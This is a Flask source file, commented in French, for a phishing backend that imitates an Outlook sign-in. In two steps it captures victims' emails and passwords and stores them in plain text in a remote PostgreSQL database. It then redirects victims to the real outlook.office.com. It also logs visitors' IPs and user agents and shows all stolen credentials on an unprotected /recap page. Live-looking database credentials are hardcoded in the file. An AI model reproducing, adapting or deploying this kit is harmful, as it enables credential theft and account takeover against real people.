from flask import Flask, request, render_template, redirect, session, render_template_string
import psycopg2
from psycopg2.extras import RealDictCursor
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = "ceci_est_une_clé_secrète_à_modifier"

# Remplace ici avec ton URL PostgreSQL Render
DATABASE_URL = "postgresql://admin:wRGvLO4UKrNf7Uq7t0nbXoDTpKPkL4rJ@dpg-cvufunmuk2gs738bgifg-a.frankfurt-postgres.render.com/logins_pezw"

def get_db():
    return psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)

def init_db():
    with get_db() as conn:
        with conn.cursor() as c:
            c.execute("""
                CREATE TABLE IF NOT EXISTS logins (
                    id SERIAL PRIMARY KEY,
                    timestamp TEXT,
                    email TEXT,
                    password TEXT
                )
            """)
            c.execute("""
                CREATE TABLE IF NOT EXISTS visits (
                    id SERIAL PRIMARY KEY,
                    timestamp TEXT,
                    ip TEXT,
                    user_agent TEXT
                )
            """)
        conn.commit()

@app.before_request
def track_visit():
    if request.endpoint not in ("static",):
        with get_db() as conn:
            with conn.cursor() as c:
                c.execute(
                    "INSERT INTO visits (timestamp, ip, user_agent) VALUES (%s, %s, %s)",
                    (
                        datetime.now().isoformat(timespec='seconds'),
                        request.remote_addr,
                        request.headers.get("User-Agent")
                    )
                )
            conn.commit()

@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")

@app.route("/log", methods=["POST"])
def step1():
    email = request.form.get("email")
    timestamp = datetime.now().isoformat(timespec='seconds')

    session["email"] = email
    session["timestamp"] = timestamp

    with get_db() as conn:
        with conn.cursor() as c:
            c.execute("INSERT INTO logins (timestamp, email, password) VALUES (%s, %s, %s)", (timestamp, email, ""))
        conn.commit()

    return render_template("password.html", email=email)

@app.route("/final", methods=["POST"])
def step2():
    email = session.get("email", "non_renseigné")
    timestamp = session.get("timestamp")
    password = request.form.get("password")

    with get_db() as conn:
        with conn.cursor() as c:
            c.execute("""
                UPDATE logins SET password = %s
                WHERE timestamp = %s AND email = %s AND password = ''
            """, (password, timestamp, email))
        conn.commit()

    session.clear()
    return redirect("https://outlook.office.com")

@app.route("/recap", methods=["GET"])
def recap():
    with get_db() as conn:
        with conn.cursor() as c:
            c.execute("SELECT timestamp, email, password FROM logins ORDER BY id DESC")
            rows = c.fetchall()

    html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th></tr>"
    for row in rows:
        html += f"<tr><td>{row['timestamp']}</td><td>{row['email']}</td><td>{row['password']}</td></tr>"
    html += "</table>"
    return html

@app.route("/visites", methods=["GET"])
def visites():
    with get_db() as conn:
        with conn.cursor() as c:
            c.execute("SELECT timestamp, ip, user_agent FROM visits ORDER BY id DESC LIMIT 50")
            rows = c.fetchall()

    html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th></tr>"
    for row in rows:
        html += f"<tr><td>{row['timestamp']}</td><td>{row['ip']}</td><td>{row['user_agent']}</td></tr>"
    html += "</table>"
    return html

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000)
